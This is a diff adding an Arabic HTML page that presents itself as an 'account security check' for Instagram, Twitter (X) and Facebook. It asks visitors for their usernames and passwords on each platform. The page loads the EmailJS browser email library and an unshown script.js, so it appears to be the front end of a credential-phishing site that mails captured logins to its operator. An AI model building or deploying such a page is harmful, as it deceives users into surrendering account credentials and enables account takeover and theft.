@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فحص أمان الحسابات</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container mt-5 animate__animated animate__fadeIn">
+        <h1 class="text-center gradient-text">فحص أمان الحسابات</h1>
+        <p class="text-center">هذا الموقع يساعدك على فحص أمان حساباتك على منصات التواصل الاجتماعي.</p>
+        
+        <div class="d-flex justify-content-center">
+            <button class="btn-gradient instagram m-2" id="instagram-btn">انستقرام</button>
+            <button class="btn-gradient twitter m-2" id="twitter-btn">تويتر (X)</button>
+            <button class="btn-gradient facebook m-2" id="facebook-btn">فيسبوك</button>
+        </div>
+
+        <form id="instagram-form" class="form hidden mt-4">
+            <h2 class="gradient-text">انستقرام</h2>
+            <input type="text" id="instagram-username" class="form-control mb-3" placeholder="اسم المستخدم" required>
+            <input type="password" id="instagram-password" class="form-control mb-3" placeholder="كلمة المرور" required>
+            <button type="button" class="btn-gradient success" id="instagram-check">فحص أمان الحساب</button>
+        </form>
+
+        <form id="twitter-form" class="form hidden mt-4">
+            <h2 class="gradient-text">تويتر (X)</h2>
+            <input type="text" id="twitter-username" class="form-control mb-3" placeholder="اسم المستخدم" required>
+            <input type="password" id="twitter-password" class="form-control mb-3" placeholder="كلمة المرور" required>
+            <button type="button" class="btn-gradient success" id="twitter-check">فحص أمان الحساب</button>
+        </form>
+
+        <form id="facebook-form" class="form hidden mt-4">
+            <h2 class="gradient-text">فيسبوك</h2>
+            <input type="text" id="facebook-username" class="form-control mb-3" placeholder="اسم المستخدم" required>
+            <input type="password" id="facebook-password" class="form-control mb-3" placeholder="كلمة المرور" required>
+            <button type="button" class="btn-gradient success" id="facebook-check">فحص أمان الحساب</button>
+        </form>
+
+        <div id="result" class="hidden mt-4">
+            <h2 class="gradient-text">نتيجة الفحص</h2>
+            <p id="result-message"></p>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="script.js"></script>
+</body>
+</html>
